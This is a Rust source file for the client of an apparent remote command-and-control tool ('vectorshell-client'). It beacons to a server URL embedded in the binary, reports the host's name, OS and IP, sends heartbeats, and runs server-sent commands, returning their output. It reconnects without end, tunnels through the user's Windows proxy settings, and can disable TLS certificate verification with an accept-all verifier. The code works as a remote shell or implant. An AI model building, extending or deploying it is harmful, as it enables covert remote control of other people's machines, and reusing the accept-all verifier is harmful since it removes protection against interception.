use crate::embedded_config::{AUTH_TOKEN, INSECURE_TLS_RAW, RECONNECT_INTERVAL_SECS, SERVER_URL};
use crate::executor::execute_command;
use futures_util::{SinkExt, StreamExt};
use shared::protocol::{
    ClientToServerMessage, HeartbeatMessage, RegisterMessage, ServerToClientMessage,
};
use std::sync::Arc;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use tokio::io::{AsyncRead, AsyncWrite};
use tokio::sync::mpsc;
use tokio_rustls::rustls::ClientConfig;
use tokio_rustls::rustls::client::danger::{
    HandshakeSignatureValid, ServerCertVerified, ServerCertVerifier,
};
use tokio_rustls::rustls::pki_types::{CertificateDer, ServerName, UnixTime};
use tokio_rustls::rustls::{DigitallySignedStruct, Error as RustlsError, SignatureScheme};
use tokio_tungstenite::tungstenite::Message;
use tokio_tungstenite::{
    connect_async, connect_async_tls_with_config, Connector, WebSocketStream,
};

#[cfg(windows)]
use std::io;
#[cfg(windows)]
use std::io::ErrorKind;
#[cfg(windows)]
use std::ptr;
#[cfg(windows)]
use tokio::io::{AsyncReadExt, AsyncWriteExt};
#[cfg(windows)]
use tokio::net::TcpStream;
#[cfg(windows)]
use tokio_tungstenite::tungstenite::client::IntoClientRequest;
#[cfg(windows)]
use tokio_tungstenite::{client_async_tls_with_config, client_async_with_config};
#[cfg(windows)]
use url::Url;

pub async fn run_client() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    loop {
        if let Err(error) = connect_once().await {
            eprintln!("connection failed: {error}");
        }
        tokio::time::sleep(Duration::from_secs(RECONNECT_INTERVAL_SECS)).await;
    }
}

async fn connect_once() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let insecure_tls = matches!(INSECURE_TLS_RAW, "1" | "true" | "TRUE");

    #[cfg(windows)]
    {
        if let Some(proxy_url) = windows_proxy_url_for_server() {
            return connect_once_via_proxy(insecure_tls, &proxy_url).await;
        }
    }

    let (ws_stream, _) = if insecure_tls && SERVER_URL.starts_with("wss://") {
        let config = insecure_rustls_config();
        connect_async_tls_with_config(SERVER_URL, None, false, Some(Connector::Rustls(config)))
            .await?
    } else {
        connect_async(SERVER_URL).await?
    };
    run_ws_session(ws_stream).await
}

async fn run_ws_session<S>(ws_stream: WebSocketStream<S>) -> Result<(), Box<dyn std::error::Error + Send + Sync>>
where
    S: AsyncRead + AsyncWrite + Unpin + Send + 'static,
{
    let (mut write, mut read) = ws_stream.split();
    let (tx, mut rx) = mpsc::unbounded_channel::<ClientToServerMessage>();

    let client_id = generate_client_id();
    let (hostname, os, arch, ip, timestamp) = collect_client_metadata();
    let register = ClientToServerMessage::Register {
        id: uuid_v4(),
        payload: RegisterMessage {
            client_id: client_id.clone(),
            token: AUTH_TOKEN.to_string(),
            hostname,
            os,
            arch,
            ip,
            timestamp,
        },
    };
    tx.send(register).ok();
    eprintln!("registered with server as {client_id}");

    let writer: tokio::task::JoinHandle<Result<(), Box<dyn std::error::Error + Send + Sync>>> =
        tokio::spawn(async move {
            while let Some(msg) = rx.recv().await {
                let json = serde_json::to_string(&msg)?;
                write.send(Message::Text(json)).await?;
            }
            Ok::<(), Box<dyn std::error::Error + Send + Sync>>(())
        });

    let heartbeat_tx = tx.clone();
    let heartbeat_client_id = client_id.clone();
    tokio::spawn(async move {
        let mut interval = tokio::time::interval(Duration::from_secs(5));
        loop {
            interval.tick().await;
            let heartbeat = ClientToServerMessage::Heartbeat {
                id: uuid_v4(),
                payload: HeartbeatMessage {
                    client_id: heartbeat_client_id.clone(),
                    timestamp: unix_timestamp(),
                },
            };
            heartbeat_tx.send(heartbeat).ok();
        }
    });

    while let Some(msg) = read.next().await {
        let msg = msg?;
        if let Message::Text(text) = msg {
            let parsed: ServerToClientMessage = serde_json::from_str(&text)?;
            match parsed {
                ServerToClientMessage::Exec { id, payload } => {
                    let result = execute_command(payload).await;
                    let result_msg = ClientToServerMessage::Result {
                        id,
                        payload: result,
                    };
                    tx.send(result_msg).ok();
                }
                ServerToClientMessage::Ping { .. } => {}
                ServerToClientMessage::Upload { .. } => {}
                ServerToClientMessage::Download { .. } => {}
            }
        }
    }

    writer.await??;
    Ok(())
}

#[cfg(windows)]
fn windows_proxy_url_for_server() -> Option<Url> {
    let target_url = Url::parse(SERVER_URL).ok()?;
    let host = target_url.host_str()?;
    winhttp_proxy_url(&target_url).or_else(|| windows_proxy_url(&target_url, host))
}

#[cfg(windows)]
fn winhttp_proxy_url(target_url: &Url) -> Option<Url> {
    use windows_sys::Win32::Foundation::GlobalFree;
    use windows_sys::Win32::Networking::WinHttp::{
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_AUTOPROXY_AUTO_DETECT, WINHTTP_AUTOPROXY_CONFIG_URL,
        WINHTTP_AUTO_DETECT_TYPE_DHCP, WINHTTP_AUTO_DETECT_TYPE_DNS_A,
        WINHTTP_AUTOPROXY_OPTIONS, WINHTTP_CURRENT_USER_IE_PROXY_CONFIG,
        WINHTTP_PROXY_INFO, WinHttpCloseHandle, WinHttpGetIEProxyConfigForCurrentUser,
        WinHttpGetProxyForUrl, WinHttpOpen,
    };

    unsafe {
        let mut ie_config = WINHTTP_CURRENT_USER_IE_PROXY_CONFIG {
            fAutoDetect: 0,
            lpszAutoConfigUrl: ptr::null_mut(),
            lpszProxy: ptr::null_mut(),
            lpszProxyBypass: ptr::null_mut(),
        };

        if WinHttpGetIEProxyConfigForCurrentUser(&mut ie_config) == 0 {
            return None;
        }

        let mut proxy_candidate: Option<Url> = None;
        let target = to_wide_null(target_url.as_str());
        let session = WinHttpOpen(
            to_wide_null("vectorshell-client").as_ptr(),
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            ptr::null(),
            ptr::null(),
            0,
        );

        if !session.is_null() {
            let mut options = WINHTTP_AUTOPROXY_OPTIONS {
                dwFlags: 0,
                dwAutoDetectFlags: 0,
                lpszAutoConfigUrl: ptr::null(),
                lpvReserved: ptr::null_mut(),
                dwReserved: 0,
                fAutoLogonIfChallenged: 1,
            };

            if !ie_config.lpszAutoConfigUrl.is_null() {
                options.dwFlags |= WINHTTP_AUTOPROXY_CONFIG_URL;
                options.lpszAutoConfigUrl = ie_config.lpszAutoConfigUrl;
            }
            if ie_config.fAutoDetect != 0 {
                options.dwFlags |= WINHTTP_AUTOPROXY_AUTO_DETECT;
                options.dwAutoDetectFlags =
                    WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
            }

            if options.dwFlags != 0 {
                let mut proxy_info = WINHTTP_PROXY_INFO {
                    dwAccessType: WINHTTP_ACCESS_TYPE_NO_PROXY,
                    lpszProxy: ptr::null_mut(),
                    lpszProxyBypass: ptr::null_mut(),
                };
                if WinHttpGetProxyForUrl(session, target.as_ptr(), &mut options, &mut proxy_info) != 0 {
                    if proxy_info.dwAccessType != WINHTTP_ACCESS_TYPE_NO_PROXY {
                        if !proxy_info.lpszProxy.is_null() {
                            let proxy_raw = pwstr_to_string(proxy_info.lpszProxy);
                            proxy_candidate = select_windows_proxy_entry(&proxy_raw, target_url.scheme())
                                .and_then(|v| normalize_proxy_url(&v));
                        }
                    }

                    if !proxy_info.lpszProxy.is_null() {
                        let _ = GlobalFree(proxy_info.lpszProxy as _);
                    }
                    if !proxy_info.lpszProxyBypass.is_null() {
                        let _ = GlobalFree(proxy_info.lpszProxyBypass as _);
                    }
                }
            }

            let _ = WinHttpCloseHandle(session);
        }

        if !ie_config.lpszAutoConfigUrl.is_null() {
            let _ = GlobalFree(ie_config.lpszAutoConfigUrl as _);
        }
        if !ie_config.lpszProxy.is_null() {
            let _ = GlobalFree(ie_config.lpszProxy as _);
        }
        if !ie_config.lpszProxyBypass.is_null() {
            let _ = GlobalFree(ie_config.lpszProxyBypass as _);
        }

        proxy_candidate
    }
}

#[cfg(windows)]
fn to_wide_null(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

#[cfg(windows)]
fn pwstr_to_string(ptr_u16: *mut u16) -> String {
    if ptr_u16.is_null() {
        return String::new();
    }
    unsafe {
        let mut len = 0usize;
        while *ptr_u16.add(len) != 0 {
            len += 1;
        }
        String::from_utf16_lossy(std::slice::from_raw_parts(ptr_u16, len))
    }
}

#[cfg(windows)]
fn windows_proxy_url(target_url: &Url, host: &str) -> Option<Url> {
    use winreg::RegKey;
    use winreg::enums::HKEY_CURRENT_USER;

    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let internet_settings = hkcu
        .open_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings")
        .ok()?;

    let proxy_enabled: u32 = internet_settings.get_value("ProxyEnable").ok()?;
    if proxy_enabled == 0 {
        return None;
    }

    let proxy_server: String = internet_settings.get_value("ProxyServer").ok()?;
    let proxy_override: String = internet_settings
        .get_value("ProxyOverride")
        .unwrap_or_default();

    if host_in_proxy_override(host, &proxy_override) {
        return None;
    }

    let selected = select_windows_proxy_entry(&proxy_server, target_url.scheme())?;
    normalize_proxy_url(&selected)
}

#[cfg(windows)]
fn select_windows_proxy_entry(proxy_server: &str, scheme: &str) -> Option<String> {
    let raw = proxy_server.trim();
    if raw.is_empty() {
        return None;
    }

    if !raw.contains('=') {
        return Some(raw.to_string());
    }

    let wanted = if matches!(scheme, "wss" | "https") {
        "https"
    } else {
        "http"
    };

    for entry in raw.split(';') {
        let mut parts = entry.splitn(2, '=');
        let key = parts.next()?.trim().to_ascii_lowercase();
        let value = parts.next()?.trim();
        if key == wanted && !value.is_empty() {
            return Some(value.to_string());
        }
    }

    for entry in raw.split(';') {
        let mut parts = entry.splitn(2, '=');
        let key = parts.next()?.trim().to_ascii_lowercase();
        let value = parts.next()?.trim();
        if key == "socks" && !value.is_empty() {
            return Some(value.to_string());
        }
    }

    None
}

#[cfg(windows)]
fn host_in_proxy_override(host: &str, proxy_override: &str) -> bool {
    let host_lower = host.to_ascii_lowercase();
    proxy_override
        .split(';')
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .any(|pattern| {
            let token = pattern.to_ascii_lowercase();
            if token == "<local>" {
                return !host_lower.contains('.');
            }
            if let Some(rest) = token.strip_prefix("*.") {
                return host_lower == rest || host_lower.ends_with(&format!(".{rest}"));
            }
            host_lower == token
        })
}

#[cfg(windows)]
fn normalize_proxy_url(raw: &str) -> Option<Url> {
    let value = raw.trim();
    if value.is_empty() {
        return None;
    }
    let candidate = if value.contains("://") {
        value.to_string()
    } else {
        format!("http://{value}")
    };
    Url::parse(&candidate).ok()
}

#[cfg(windows)]
async fn connect_once_via_proxy(
    insecure_tls: bool,
    proxy_url: &Url,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let target_url = Url::parse(SERVER_URL)?;
    let target_host = target_url
        .host_str()
        .ok_or_else(|| io::Error::new(ErrorKind::InvalidInput, "server url missing host"))?;
    let target_port = target_url
        .port_or_known_default()
        .ok_or_else(|| io::Error::new(ErrorKind::InvalidInput, "server url missing port"))?;

    let proxy_host = proxy_url
        .host_str()
        .ok_or_else(|| io::Error::new(ErrorKind::InvalidInput, "proxy url missing host"))?;
    let proxy_port = proxy_url
        .port_or_known_default()
        .ok_or_else(|| io::Error::new(ErrorKind::InvalidInput, "proxy url missing port"))?;

    let mut stream = TcpStream::connect((proxy_host, proxy_port)).await?;
    let request = format!(
        "CONNECT {target_host}:{target_port} HTTP/1.1\r\nHost: {target_host}:{target_port}\r\nConnection: keep-alive\r\n\r\n"
    );
    stream.write_all(request.as_bytes()).await?;

    let mut response = Vec::with_capacity(1024);
    let mut buf = [0u8; 1024];
    loop {
        let n = stream.read(&mut buf).await?;
        if n == 0 {
            return Err(io::Error::new(ErrorKind::UnexpectedEof, "proxy closed connection").into());
        }
        response.extend_from_slice(&buf[..n]);
        if response.windows(4).any(|w| w == b"\r\n\r\n") {
            break;
        }
        if response.len() > 16 * 1024 {
            return Err(io::Error::new(ErrorKind::InvalidData, "proxy response too large").into());
        }
    }

    let response_text = String::from_utf8_lossy(&response);
    let status_line = response_text.lines().next().unwrap_or("<empty>");
    if !status_line.contains(" 200 ") {
        return Err(io::Error::new(
            ErrorKind::PermissionDenied,
            format!("proxy CONNECT failed: {status_line}"),
        )
        .into());
    }

    let ws_request = SERVER_URL.into_client_request()?;
    if matches!(target_url.scheme(), "wss" | "https") {
        let (ws_stream, _) = if insecure_tls {
            let connector = Connector::Rustls(insecure_rustls_config());
            client_async_tls_with_config(ws_request, stream, None, Some(connector)).await?
        } else {
            client_async_tls_with_config(ws_request, stream, None, None).await?
        };
        run_ws_session(ws_stream).await
    } else {
        let (ws_stream, _) = client_async_with_config(ws_request, stream, None).await?;
        run_ws_session(ws_stream).await
    }
}

fn generate_client_id() -> String {
    let hostname = std::env::var("HOSTNAME").unwrap_or_else(|_| "client".to_string());
    format!("{}-{}", hostname, uuid_v4())
}

fn collect_client_metadata() -> (String, String, String, String, u64) {
    let hostname = std::env::var("HOSTNAME").unwrap_or_else(|_| "client".to_string());
    let os = std::env::consts::OS.to_string();
    let arch = std::env::consts::ARCH.to_string();
    let ip = local_ip_address::local_ip()
        .map(|addr| addr.to_string())
        .unwrap_or_else(|_| "".to_string());
    let timestamp = unix_timestamp();
    (hostname, os, arch, ip, timestamp)
}

fn uuid_v4() -> String {
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default();
    format!("{}-{}", now.as_secs(), now.subsec_nanos())
}

fn unix_timestamp() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs()
}

fn insecure_rustls_config() -> Arc<ClientConfig> {
    let verifier = InsecureVerifier;
    let config = ClientConfig::builder()
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(verifier))
        .with_no_client_auth();
    Arc::new(config)
}

#[derive(Debug)]
struct InsecureVerifier;

impl ServerCertVerifier for InsecureVerifier {
    fn verify_server_cert(
        &self,
        _end_entity: &CertificateDer<'_>,
        _intermediates: &[CertificateDer<'_>],
        _server_name: &ServerName<'_>,
        _ocsp_response: &[u8],
        _now: UnixTime,
    ) -> Result<ServerCertVerified, RustlsError> {
        Ok(ServerCertVerified::assertion())
    }

    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &CertificateDer<'_>,
        _dss: &DigitallySignedStruct,
    ) -> Result<HandshakeSignatureValid, RustlsError> {
        Ok(HandshakeSignatureValid::assertion())
    }

    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &CertificateDer<'_>,
        _dss: &DigitallySignedStruct,
    ) -> Result<HandshakeSignatureValid, RustlsError> {
        Ok(HandshakeSignatureValid::assertion())
    }

    fn supported_verify_schemes(&self) -> Vec<SignatureScheme> {
        vec![
            SignatureScheme::RSA_PSS_SHA256,
            SignatureScheme::RSA_PSS_SHA384,
            SignatureScheme::RSA_PSS_SHA512,
            SignatureScheme::RSA_PKCS1_SHA256,
            SignatureScheme::RSA_PKCS1_SHA384,
            SignatureScheme::RSA_PKCS1_SHA512,
            SignatureScheme::ECDSA_NISTP256_SHA256,
            SignatureScheme::ECDSA_NISTP384_SHA384,
            SignatureScheme::ED25519,
        ]
    }
}
